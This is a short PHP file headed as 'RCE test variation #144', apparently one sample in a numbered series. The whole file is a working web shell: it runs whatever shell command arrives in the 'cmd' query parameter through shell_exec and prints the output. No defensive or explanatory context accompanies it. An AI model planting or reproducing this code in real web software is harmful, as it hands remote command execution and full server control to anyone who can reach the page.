<?php
// RCE test variation #144
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>